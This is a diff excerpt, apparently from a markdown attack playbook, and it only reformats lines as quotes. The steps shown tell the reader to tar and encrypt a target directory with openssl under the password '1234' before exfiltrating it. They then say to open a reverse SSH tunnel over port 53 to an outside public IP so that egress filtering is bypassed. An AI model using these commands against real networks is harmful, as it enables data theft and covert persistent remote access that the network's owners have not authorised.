@@ -33,13 +33,13 @@ http://sjoosten.nl/2013/06/luks-usb-stick.html
 
 7.) Exfil data. All data should be encrypted with openssl before exfiltration.
 
-tar -P -zcf - $dirname | openssl aes-128-cbc -out $dirname.tar.gz -k 1234
+> tar -P -zcf - $dirname | openssl aes-128-cbc -out $dirname.tar.gz -k 1234
 
 (tar/gzip everything in a given directory. AES-128 encrpt file. set the password to the file as "1234")
 
 
 8.) Opens reverse ssh into network. 
-ssh -R 53:localhost:22 sourceuser@<public ip>
-tunnel through port 53 (because it it is normally unblocked)
+> ssh -R 53:localhost:22 sourceuser@<public ip>
+> tunnel through port 53 (because it it is normally unblocked)
 
 9.) Win...
